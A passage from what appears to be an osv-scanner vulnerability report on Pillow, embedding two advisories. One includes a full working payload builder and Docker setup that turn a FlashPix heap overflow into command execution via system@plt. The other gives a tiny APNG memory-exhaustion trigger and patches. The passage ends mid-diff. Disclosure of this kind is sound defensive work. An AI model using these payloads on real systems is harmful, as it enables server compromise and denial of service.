pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -\u003e tp_as_buffer -\u003e bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e To facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).\n\u003e \n\u003e The source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).\n\u003e \n\u003e `vulnerable.py` is the program under test, a one-liner that opens the file it is given:\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # The entire vulnerable operation an application performs on an untrusted file.\n\u003e import sys\n\u003e from PIL import Image\n\u003e \n\u003e Image.open(sys.argv[1]).load()\n\u003e ```\n\u003e \n\u003e The payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:\n\u003e \n\u003e ```console\n\u003e $ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx\n\u003e [control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0\n\u003e [control] opening it: vtable hijack -\u003e call *0x4206c0 with rdi -\u003e 'id'\n\u003e ```\n\u003e \n\u003e Then open it with `vulnerable.py`:\n\u003e \n\u003e ```console\n\u003e $ python3 vulnerable.py shell.fpx\n\u003e uid=0(root) gid=0(root) groups=0(root)\n\u003e corrupted size vs. prev_size\n\u003e ```\n\u003e \n\u003e `Image.open()` of the crafted file runs the baked command via `system(\"id\")`: command execution as the user running the image processing (root in the container).\n\u003e \n\u003e The trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has\n\u003e already run.\n\u003e \n\u003e The builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e This is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.\n\u003e \n\u003e ### Annex A: Docker setup\n\u003e \n\u003e The PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.\n\u003e \n\u003e **1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`\n\u003e ([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:\n\u003e \n\u003e ```dockerfile\n\u003e FROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54\n\u003e RUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n\u003e         ca-certificates \\\n\u003e         python3.12=3.12.3-1ubuntu0.13 python3.12-venv=3.12.3-1ubuntu0.13 \\\n\u003e     \u0026\u0026 rm -rf /var/lib/apt/lists/*\n\u003e RUN python3.12 -m venv /opt/v \\\n\u003e     \u0026\u0026 /opt/v/bin/pip install --no-cache-dir \"Pillow==12.2.0\" \"olefile==0.47\"\n\u003e ENV PATH=/opt/v/bin:$PATH\n\u003e WORKDIR /poc\n\u003e # ASLR is an OS mitigation unrelated to the bug; disable it in-image for a deterministic heap.\n\u003e ENTRYPOINT [\"setarch\", \"-R\"]\n\u003e CMD [\"bash\"]\n\u003e ```\n\u003e \n\u003e ```console\n\u003e $ docker build -t fjpeg1-poc .\n\u003e ...\n\u003e Downloading pillow-12.2.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)\n\u003e Successfully installed Pillow-12.2.0 olefile-0.47\n\u003e Successfully built 370344c832b6\n\u003e Successfully tagged fjpeg1-poc:latest\n\u003e ```\n\u003e \n\u003e **2. Start the (ASLR-disabled) container shell** with the scripts mounted:\n\u003e \n\u003e ```sh\n\u003e docker run --rm -it --security-opt seccomp=unconfined -v \"$PWD:/poc\" -w /poc fjpeg1-poc\n\u003e ```\n\u003e \n\u003e ### Annex B: payload builder source\n\u003e \n\u003e `make_payload.py`:\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).\n\u003e Builds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -\u003e JCS_UNKNOWN\n\u003e path, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.\n\u003e   --crash      flood an adjacent ob_type with 0x42.. -\u003e SIGSEGV in PyBuffer_Release\n\u003e   (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -\u003e call *--target\n\u003e Defaults target the pinned Docker image with ASLR disabled (setarch -R). See --help.\"\"\"\n\u003e import sys, io, struct, math, argparse\n\u003e from PIL import Image\n\u003e \n\u003e W, H = 65000, 2\n\u003e SECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748\n\u003e FREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF\n\u003e FPX_CLSID = bytes.fromhex(\"0067615654C1CE11855300AA00A1F95B\")\n\u003e o32 = lambda v: struct.pack(\"\u003cI\", v)\n\u003e p64 = lambda v: struct.pack(\"\u003cQ\", v)\n\u003e INV = bytes(255 - i for i in range(256))   # 8-bit inversion table\n\u003e \n\u003e def jpeg(src):\n\u003e     b = io.BytesIO()\n\u003e     Image.frombytes(\"CMYK\", (W, H), bytes(src)).save(b, \"JPEG\", quality=100, subsampling=0)\n\u003e     return b.getvalue()\n\u003e \n\u003e def decode_row(jpg):\n\u003e     # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits\n\u003e     # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R\n\u003e     # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The\n\u003e     # last decoded row is the one that lands in (and overflows past) the buffer.\n\u003e     px = Image.open(io.BytesIO(jpg)).tobytes()\n\u003e     return px[(H - 1) * W * 4:].translate(INV)\n\u003e \n\u003e def craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -\u003e iterate to converge)\n\u003e     # base fill 0xBD -\u003e decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern\n\u003e     # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).\n\u003e     src = bytearray(b\"\\xbd\" * (W * H * 4)); base = (H - 1) * W * 4; it = 0\n\u003e     for off, t in targets:\n\u003e         for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v\n\u003e     for it in range(iters):\n\u003e         dec = decode_row(jpeg(src)); bad = 0\n\u003e         for off, t in targets:\n\u003e             for i, v in enumerate(t):\n\u003e                 if dec[off + i] != v:\n\u003e                     bad += 1\n\u003e                     src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))\n\u003e         if not bad: break\n\u003e     return jpeg(src), it, bad\n\u003e \n\u003e def maxid_for(w, h):\n\u003e     s, i = max(w, h), 1\n\u003e     while s \u003e 64: s //= 2; i += 1\n\u003e     return i - 1\n\u003e MAXID = maxid_for(W, H); RESNAME = \"Resolution %04d\" % MAXID\n\u003e \n\u003e def image_contents():\n\u003e     ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b\n\u003e     cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -\u003e rawmode \"LA\"\n\u003e     props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID \u003c\u003c 16), blob(cb))]\n\u003e     voff = 8 + 8 * len(props); idx = vals = b\"\"\n\u003e     for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)\n\u003e     body = o32(len(props)) + idx + vals\n\u003e     return (struct.pack(\"\u003cHHI\", 0xFFFE, 0, 0x00020005) + b\"\\x00\" * 16 + o32(1) + b\"\\x00\" * 16\n\u003e             + o32(48) + o32(len(body) + 4) + body)\n\u003e \n\u003e def subimage_header():\n\u003e     b = bytearray(80)\n\u003e     for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),\n\u003e                  (56, 36), (60, 16), (64, 0), (72, 2)]:\n\u003e         struct.pack_into(\"\u003cI\", b, o, v)\n\u003e     return bytes(b)\n\u003e \n\u003e def build_fpx(jpg, out):\n\u003e     data = b\"\\x00\" * 28 + jpg\n\u003e     assert len(data) \u003c= DATA_PAD, (len(data), DATA_PAD)\n\u003e     pad = lambda x: x + b\"\\x00\" * ((-len(x)) % SECT)\n\u003e     sd = {\"ic\": pad(image_contents().ljust(4096, b\"\\x00\")),\n\u003e           \"hdr\": pad(subimage_header().ljust(4096, b\"\\x00\")),\n\u003e           \"dat\": pad(data.ljust(DATA_PAD, b\"\\x00\"))}\n\u003e     ns = lambda x: len(x) // SECT; order = [\"ic\", \"dat\", \"hdr\"]\n\u003e     dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)\n\u003e     fsec = 1\n\u003e     while fsec * 128 \u003c fsec + content: fsec += 1\n\u003e     pos = {}; cur = fsec; dstart = cur; cur += dsec\n\u003e     for k in order: pos[k] = cur; cur += ns(sd[k])\n\u003e     total = cur\n\u003e     fat = [FREESECT] * (fsec * 128)\n\u003e     for s in range(fsec): fat[s] = FATSECT\n\u003e     def chain(a, n):\n\u003e         for j in range(n): fat[a + j] = a + j + 1 if j \u003c n - 1 else ENDOFCHAIN\n\u003e     chain(dstart, dsec)\n\u003e     for k in order: chain(pos[k], ns(sd[k]))\n\u003e     def de(nm, t, ch, l, r, st, sz, cl=b\"\\x00\" * 16):\n\u003e         n = (nm.encode(\"utf-16-le\") + b\"\\x00\\x00\").ljust(64, b\"\\x00\")[:64]\n\u003e         return (n + struct.pack(\"\u003cHBB\", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)\n\u003e                 + o32(ch) + cl + o32(0) + b\"\\x00\" * 16 + o32(st) + struct.pack(\"\u003cQ\", sz))\n\u003e     directory = pad(b\"\".join([\n\u003e         de(\"Root Entry\", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),\n\u003e         de(\"Data Object Store 000001\", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n\u003e         de(\"\\x05Image Contents\", 2, NOSTREAM, NOSTREAM, 3, pos[\"ic\"], len(sd[\"ic\"])),\n\u003e         de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n\u003e         de(\"Subimage 0000 Data\", 2, NOSTREAM, NOSTREAM, 5, pos[\"dat\"], len(sd[\"dat\"])),\n\u003e         de(\"Subimage 0000 Header\", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos[\"hdr\"], len(sd[\"hdr\"]))]))\n\u003e     h = bytearray(512); h[0:8] = bytes.fromhex(\"D0CF11E0A1B11AE1\")\n\u003e     for o, fmt, *v in [(24, \"\u003cHH\", 0x3E, 3), (28, \"\u003cH\", 0xFFFE), (30, \"\u003cHH\", 9, 6), (44, \"\u003cI\", fsec),\n\u003e                        (48, \"\u003cI\", dstart), (56, \"\u003cI\", 4096), (60, \"\u003cI\", ENDOFCHAIN), (68, \"\u003cI\", ENDOFCHAIN)]:\n\u003e         struct.pack_into(fmt, h, o, *v)\n\u003e     for i in range(109): struct.pack_into(\"\u003cI\", h, 76 + i * 4, i if i \u003c fsec else FREESECT)\n\u003e     secs = [b\"\"] * total\n\u003e     for s in range(fsec): secs[s] = b\"\".join(o32(x) for x in fat[s * 128:(s + 1) * 128])\n\u003e     for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]\n\u003e     for k in order:\n\u003e         for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]\n\u003e     open(out, \"wb\").write(bytes(h) + b\"\".join(secs))\n\u003e \n\u003e def xhex(s): return int(s, 16)\n\u003e \n\u003e SYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)\n\u003e \n\u003e def main():\n\u003e     ap = argparse.ArgumentParser(description=\"F-JPEG-1 .fpx payload builder (0-ASLR box)\")\n\u003e     ap.add_argument(\"--out\", required=True, help=\"output .fpx path\")\n\u003e     ap.add_argument(\"--crash\", action=\"store_true\",\n\u003e                     help=\"crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)\")\n\u003e     ap.add_argument(\"--heap-base\", type=xhex, default=0xbaa000,\n\u003e                     help=\"fixed heap base of the 0-ASLR box (default 0xbaa000)\")\n\u003e     ap.add_argument(\"--offset\", type=xhex, default=0x21e800,\n\u003e                     help=\"state-\u003ebuffer - heap_base (default 0x21e800 -\u003e S=0xdc8800)\")\n\u003e     ap.add_argument(\"--target\", type=xhex, default=SENTINEL,\n\u003e                     help=\"value called via the hijacked vtable; pass %#x (system@plt) for \"\n\u003e                          \"command execution (default is a sentinel for an RIP-control demo)\" % SYSTEM_PLT)\n\u003e     ap.add_argument(\"--cmd\", default=\"id\",\n\u003e                     help=\"command system() runs, written inline at obj+0 / rdi (\u003c=7 bytes, e.g. id, id;w)\")\n\u003e     a = ap.parse_args()\n\u003e \n\u003e     if a.crash:\n\u003e         # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD\n\u003e         # to make the decoded overflow bytes 0x42 -\u003e the adjacent ob_type becomes 0x4242424242424242.\n\u003e         build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)\n\u003e         print(\"[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 \"\n\u003e               \"-\u003e SIGSEGV in PyBuffer_Release (no addresses)\" % a.out)\n\u003e         return\n\u003e \n\u003e     if len(a.cmd.encode()) \u003e 7:\n\u003e         sys.exit(\"--cmd must be \u003c=7 bytes (it is written inline at obj+0, before ob_type)\")\n\u003e     S = a.heap_base + a.offset\n\u003e     A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET\n\u003e     tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),\n\u003e           (OB_TYPE_OFF - 8, a.cmd.encode() + b\"\\x00\")]      # obj+0 -\u003e rdi for system()\n\u003e     tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -\u003e spray B at +0xa0..+8\n\u003e     tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]\n\u003e     jpg, it, bad = craft(tg)\n\u003e     build_fpx(jpg, a.out)\n\u003e     print(\"[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d\"\n\u003e           % (a.out, S, a.target, a.cmd, it, bad))\n\u003e     print(\"[control] opening it: vtable hijack -\u003e call *%#x with rdi -\u003e %r\" % (a.target, a.cmd))\n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     main()\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5x8w-8jj5-q52h | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112398\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112398",
              "name": "CVE-2026-112398",
              "properties": {
                "security-severity": "9.2"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-112398: Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution",
                "text": "CVE-2026-112398: Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112399",
                "BIT-pillow-2026-112399",
                "GHSA-5xm2-6676-qcp9"
              ],
              "fullDescription": {
                "markdown": "```\n============================================================================\nAPNG background disposal allocates full canvas before decompression bomb check\nLocation: src/PIL/PngImagePlugin.py:1000  in PngImageFile._seek()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA 126-byte animated PNG file makes Pillow's `Image.open()` allocate and fill memory sized by the image dimensions the file claims, before Pillow's built-in check for oversized images runs. A file claiming 22000×22000 pixels costs about 1.9 GB. Anyone who can get an application to open an image they supply, with default settings and no further calls such as `load()`, can cause a multi-gigabyte memory spike per file. If the claimed size exceeds the machine's free memory, the operating system kills the process outright.\n\nThe bug is in `PngImageFile._seek()` in `src/PIL/PngImagePlugin.py` (around line 1000). For any APNG, `_open()` calls `self._seek(0)`. When the first `fcTL` chunk requests `OP_BACKGROUND` disposal, `_seek()` calls `Image.core.fill(self.mode, self.size)` with the full IHDR size, which allocates and zero-fills width×height×4 bytes. `OP_PREVIOUS` takes the same path, because frame 0 rewrites it to `OP_BACKGROUND`. This all happens inside the plugin factory, so `Image.open()`'s `_decompression_bomb_check(im.size)` only runs after the memory has been touched. A 1×1 frame rectangle passes the only checks on the way.\n\nBelow available memory, the allocation is freed when `DecompressionBombError` propagates, so sustained pressure needs repeated or concurrent uploads. A 45000×45000 header gets the process killed by the out-of-memory killer on an 8 GB host. The attached reproducer opens two such files that differ in one byte (`dispose_op` 0 vs 1). Both end in `DecompressionBombError`, but peak resident memory is 17 MB for the first and 1864 MB for the second. The eager fill was introduced in 5e4e0fa6ee67 (\"Use disposal settings from previous frame\", December 2020) and first shipped in 8.1.0. Two candidate patches with a regression test are attached.\n\n## Details\n\nFor an APNG whose first `fcTL` chunk requests `OP_BACKGROUND` disposal, `PngImageFile._open()` creates and zero-fills a core image of the full IHDR-declared size. This happens inside the plugin factory, i.e. before `Image.open()` gets to `_decompression_bomb_check(im.size)`, so the check that is meant to reject oversized headers without allocating anything runs only after the allocation has been made and touched.\n\nThe following 126-byte file (all chunk lengths and CRCs valid) makes `Image.open(io.BytesIO(data))`, with default `MAX_IMAGE_PIXELS` and no `load()`, reach 1.86 GB resident (`ru_maxrss`) and then raise `DecompressionBombError`. The byte-identical file with `dispose_op=0` raises the same error at 17 MB.\n\n```\nIHDR  width=22000 height=22000 bit_depth=8 colour_type=6 (RGBA)\nacTL  num_frames=2 num_plays=0\nfcTL  seq=0 w=1 h=1 x=0 y=0 delay=1/10 dispose_op=1 (OP_BACKGROUND) blend_op=0\nIDAT  zlib(00 00 00 00 00)                      # one 1x1 RGBA scanline\nIEND\n```\n\nWith `width=height=45000` (8.1 GB canvas) the same call attempts the full allocation: under a 4 GiB `RLIMIT_AS` it fails with `MemoryError` from the allocator instead of `DecompressionBombError`; without a cap, on an 8 GB host with no swap, the process is OOM-killed.\n\n### Code path\n\n`Image.open()` runs the bomb check only after the plugin's constructor (and therefore `_open()`) has returned:\n\n```python\n# src/PIL/Image.py:3699-3701\n                    im = factory(fp, filename)\n                    _decompression_bomb_check(im.size)\n                    return im\n```\n\nFor a plain PNG that ordering is fine: `PngImageFile._open()` only parses chunks up to the first `IDAT` and records `self._size` from `IHDR`; nothing is allocated from it. For an APNG (`acTL` seen, so `im_n_frames` is set) `_open()` additionally positions on frame 0:\n\n```python\n# src/PIL/PngImagePlugin.py:845-853\n        if self.png.im_n_frames is not None:\n            …\n            self._seek(0)\n```\n\n`_seek(0)` copies `disposal` and `bbox` from the `fcTL` chunk into `self.dispose_op` / `self.dispose_extent` and then prepares the disposal image for the *next* frame eagerly, using the full image size:\n\n```python\n# src/PIL/PngImagePlugin.py:991-1001\n        if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n            self.dispose_op = Disposal.OP_BACKGROUND\n\n        self.dispose = None\n        if self.dispose_op == Disposal.OP_PREVIOUS:\n            …\n        elif self.dispose_op == Disposal.OP_BACKGROUND:\n            self.dispose = Image.core.fill(self.mode, self.size)\n            self.dispose = self._crop(self.dispose, self.dispose_extent)\n```\n\n`Image.core.fill` is `_fill()` in `src/_imaging.c:711`, which does `ImagingNewDirty(mode, xsize, ysize)` followed by `ImagingFill()`; `ImagingFill` (`src/libImaging/Fill.c:23`) writes every row, so the whole `width*height*4` bytes become resident rather than merely reserved. `self.size` here is the IHDR size (22000×22000), not the 1×1 frame rectangle. The `_crop` on the next line does call `_decompression_bomb_check`, but on the `fcTL` rectangle (1×1) and only after the fill has completed. Lines 991-992 rewrite `OP_PREVIOUS` to `OP_BACKGROUND` on frame 0, so `dispose_op=2` takes the same path (verified: identical 1.86 GB peak). When the first `fcTL` rectangle is large, the `_crop` copy is a second extent-sized buffer on top of the full-canvas fill, so the transient peak can reach about twice the canvas: a 13000×13000 full-frame `fcTL` (below the error threshold, so `Image.open()` succeeds with only a `DecompressionBombWarning`) peaks at 1.31 GB for a 0.66 GB canvas.\n\nThe only validation `chunk_fcTL` applies (`src/PIL/PngImagePlugin.py:740-745`) is that the frame rectangle fits inside the IHDR size, which a 1×1 frame always does; IHDR width/height themselves are unconstrained 32-bit values at this point. Control then returns to `_open_core`, `_decompression_bomb_check((22000, 22000))` raises, and the 1.9 GB core image is released when the half-constructed `PngImageFile` is discarded.\n\nThe eager full-size fill in `_seek()` was introduced in `5e4e0fa6ee67` (\"Use disposal settings from previous frame\", 2020-12-24) and first shipped in 8.1.0; before it, the `OP_BACKGROUND` fill lived in `load_end()` and could not be reached from `Image.open()`.\n\n## Impact\n\nAny application that calls `Image.open()` on untrusted bytes with default settings — the configuration in which the decompression-bomb check is supposed to make that call cheap and safe — can be made to allocate and write an attacker-chosen amount of memory from a ~126-byte PNG upload, before any error is reported and without `load()`, frame iteration, or `LOAD_TRUNCATED_IMAGES`. The amount is set directly by the IHDR width/height (4 bytes per pixel for colour type 6): values below the host's free memory cause a transient multi-GB spike per request (≈15,000,000× amplification at 22000×22000) that is freed when the exception propagates, so concurrent or repeated uploads are needed to sustain pressure; values above it get the worker process OOM-killed outright. PNG is accepted by essentially every upload pipeline, and the file passes `_accept` and chunk CRC checks as a well-formed APNG.\n\nThis is the same class as the recent bomb-check additions for WMF (load at a different DPI), FITS, GIF and FontFile — an allocation sized from file-declared numbers on a path `_decompression_bomb_check` does not cover — but here the uncovered path is `Image.open()` itself rather than a later `load()`/`seek()`.\n\n## Reproducing\n\n`repro` is a single Python script (no build step, no companion files). It builds two PNGs in memory, opens each one with plain `Image.open(io.BytesIO(data))` in a fresh child interpreter using default settings and no `load()`, and has each child report the exception it got and its own peak RSS (`ru_maxrss`). It needs about 2 GB of free RAM and finishes in about a second.\n\nThe two files are 126 bytes each and differ in exactly one byte, the `dispose_op` of the first `fcTL` chunk: `0` (`OP_NONE`) for the control and `1` (`OP_BACKGROUND`) for the attack. Both declare IHDR 22000×22000 RGBA. That is 484 Mpixel, above the 2×`MAX_IMAGE_PIXELS` error threshold, so `Image.open()` has to reject both with `DecompressionBombError`. Each chunk has a job:\n\n- The `acTL` chunk (2 frames) makes `_open()` call `_seek(0)`.\n- The 1×1 `fcTL` rectangle passes `chunk_fcTL`'s bounds check and `_crop`'s bomb check.\n- The one-scanline `IDAT` ends header parsing.\n\nExpected output on this tree:\n\n```\n126-byte APNG declaring 22000x22000 RGBA; Image.open(BytesIO(data)), defaults\n  control  dispose_op=0 OP_NONE        -\u003e DecompressionBombError peak RSS    17 MB\n  attack   dispose_op=1 OP_BACKGROUND  -\u003e DecompressionBombError peak RSS  1864 MB\nImage.open() touched a full 22000x22000 canvas before the bomb check ran\nBUG\n```\n\nBoth files are rejected, but the control is rejected at interpreter size. The attack file only reaches the bomb check after `Image.core.fill(\"RGBA\", (22000, 22000))` has allocated and zero-filled about 1.9 GB. The script prints `BUG` if the attack child's peak RSS is at least 1000 MB and at least 20× the control's, or if the attack child is killed by `SIGKILL` (for example by the OOM killer on a small host). Otherwise it prints `OK`; any other non-zero child exit is treated as a harness failure, printed with the child's output, and also ends in `OK`. With either attached patch applied, both children report about 17–22 MB and the script prints `OK`.\n\nThe allocation grows with the header, so it can be scaled by changing `SIZE` in the script. The 45000×45000 case (an 8.1 GB canvas) is covered in Details and is not part of the script.\n\n## Suggested fix\n\nDo not build the `OP_BACKGROUND` disposal image from the declared size during `_open()`. Two alternative patches are attached; both change only `src/PIL/PngImagePlugin.py`, and both add the same regression test to `Tests/test_file_apng.py` (a 2³¹−1 × 1 APNG built in memory with a 1×1 `OP_BACKGROUND` first frame must make `Image.open()` raise `DecompressionBombError`; on the current tree the fill fails first with `MemoryError`). Attached patch 1 is the preferred fix.\n\n**Attached patch 1** moves the fill to its only point of use, the `frame \u003e 0` branch of `_seek()` right after `self.load()` — which can only run once `Image.open()` has returned (bomb check passed) and the canvas itself has been allocated — and, as `GifImagePlugin` already does, fills only the previous frame's dispose extent instead of a full canvas that is then cropped:\n\n```diff\n--- a/src/PIL/PngImagePlugin.py\n+++ b/src/PIL/PngImagePlugin.py\n@@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n             # ensure previous frame was loaded\n             self.load()\n \n+            if self.dispose_op == Disposal.OP_BACKGROUND:\n+                # Created here rather than in the previous _seek(), so that\n+                # nothing is allocated from the declared image size before\n+                # the decompression bomb check in Image.open() has run.\n+                # Only dispose the extent of the previous frame.\n+                x0, y0, x1, y1 = self.dispose_extent\n+                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n             if self.dispose:\n                 self.im.paste(self.dispose, self.dispose_extent)\n             self._prev_im = self.im.copy()\n@@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n             if self._prev_im:\n                 self.dispose = self._prev_im.copy()\n                 self.dispose = self._crop(self.dispose, self.dispose_extent)\n-        elif self.dispose_op == Disposal.OP_BACKGROUND:\n-            self.dispose = Image.core.fill(self.mode, self.size)\n-            self.dispose = self._crop(self.dispose, self.dispose_extent)\n```\n\nAt that point `self.dispose_op` and `self.dispose_extent` still hold the previous frame's values (they are reassigned further down in `_seek`), so disposal semantics are unchanged; the `OP_PREVIOUS` copy stays eager because `load_end()` pastes into `_prev_im` in place (`src/PIL/PngImagePlugin.py:1110`). With this patch `Image.open()` allocates nothing from the declared size, including in the `DecompressionBombWarning` range.\n\n**Attached patch 2** is a smaller diff that keeps the eager disposal setup in `_seek()` and mirrors `GifImagePlugin._seek()`'s `OP_BACKGROUND` handling exactly: it computes the size of the `fcTL` rectangle (already validated by `chunk_fcTL` to lie within the image), runs `Image._decompression_bomb_check()` on it, and fills an image of only that size instead of filling `self.size` and cropping. It also narrows the `dispose_extent` annotation to `tuple[int, int, int, int]` so the bomb-check call type-checks. The trade-off is that a full-canvas first frame still allocates a bomb-checked image inside `Image.open()` — up to about 2×`MAX_IMAGE_PIXELS`×4 bytes (660 MB for a 13000×13000 full-frame `fcTL`, with `DecompressionBombWarning`) — and a first `fcTL` covering a canvas above the error threshold now raises `DecompressionBombError` from `_seek(0)` rather than from `Image.open()`'s own check.\n\nWith either patch applied to a clean checkout, the reproducer prints `OK` and all 54 files in `Tests/images/apng/` decode byte-identically frame by frame, including after a rewind.\n\n## The patch (1 of 2)\n\nCreate the APNG OP_BACKGROUND disposal image when the next frame is sought, sized to the frame extent, not in _open() from the IHDR size\n\nApplies to `src/PIL/PngImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\nindex 15689476c..6e61c8b4b 100644\n--- a/Tests/test_file_apng.py\n+++ b/Tests/test_file_apng.py\n@@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n         assert im.size == (128, 64)\n \n \n+def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n+    # The disposal image must not be created from the declared image size\n+    # before the decompression bomb check in Image.open() has run.\n+    # A canvas this wide cannot be allocated, so if it is attempted,\n+    # a MemoryError is raised instead of a DecompressionBombError.\n+    o16 = PngImagePlugin.o16\n+    o32 = PngImagePlugin.o32\n+\n+    b = BytesIO()\n+    b.write(PngImagePlugin._MAGIC)\n+    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n+    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n+    